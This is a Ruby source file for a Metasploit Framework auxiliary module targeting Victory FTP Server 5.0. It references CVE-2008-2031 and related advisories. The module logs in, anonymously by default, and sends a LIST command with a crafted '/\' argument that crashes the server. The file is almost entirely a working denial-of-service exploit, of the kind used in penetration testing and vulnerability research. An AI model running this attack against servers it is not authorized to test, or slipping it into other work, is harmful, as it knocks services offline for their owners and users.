##
# $Id: vicftps50_list.rb 15546 2012-06-28 19:34:06Z rapid7 $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ftp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Victory FTP Server 5.0 LIST DoS',
			'Description'    => %q{
				The Victory FTP Server v5.0 can be brought down by sending
				a very simple LIST command
			},
			'Author'         => 'kris katterjohn',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 15546 $',
			'References'     =>
				[
					[ 'CVE', '2008-2031' ],
					[ 'CVE', '2008-6829' ],
					[ 'OSVDB', '44608' ],
					[ 'EDB', '6834' ]
				],
			'DisclosureDate' => 'Oct 24 2008'))

		# They're required
		register_options([
			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
		])
	end

	def run
		return unless connect_login

		print_status("Sending command...")

		# Try to wait for a response
		resp = send_cmd(['LIST', [0x2f, 0x5c].pack('CC')])

		disconnect
	end
end
